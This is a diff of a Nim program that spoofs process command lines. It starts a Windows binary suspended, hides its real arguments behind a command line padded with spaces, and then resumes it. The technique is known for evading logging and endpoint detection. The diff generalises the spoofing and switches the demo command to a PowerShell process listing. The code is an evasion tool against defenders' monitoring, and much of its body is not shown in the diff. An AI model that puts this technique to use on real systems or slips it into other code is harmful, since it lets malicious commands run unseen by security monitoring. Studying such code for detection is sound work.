@@ -1,10 +1,15 @@
 import winim
-import strformat
-import os
+import strutils
 
-proc executeSpoofedLolbin(realCmdline: WideCStringObj) =
 
-    var spoofedCmdline = newWideCString("c:\\windows\\system32\\cmd.exe kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk")
+proc executeSpoofedLolbin(realCmdlineN: string) =
+
+    # Create spoodef cmdline
+    var binary = realCmdlineN.split(" ")[0]
+    var argsLen = len(realCmdlineN) - len(binary)
+    var spoofedCmdlineN = binary & ' '.repeat(argsLen)
+    var realCmdline = newWideCString(realCmdlineN)
+    var spoofedCmdline = newWideCString(spoofedCmdlineN)
 
     # Create suspended process
     var si: STARTUPINFOEX
@@ -62,8 +67,8 @@ proc executeSpoofedLolbin(realCmdline: WideCStringObj) =
     ResumeThread(pi.hThread)
 
 
-var realCmdline = newWideCString("c:\\windows\\system32\\cmd.exe /c echo hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii")
-executeSpoofedLolbin(realCmdline)
+
+executeSpoofedLolbin("c:\\windows\\system32\\cmd.exe /c powershell -command get-process chrome")
 
 
 
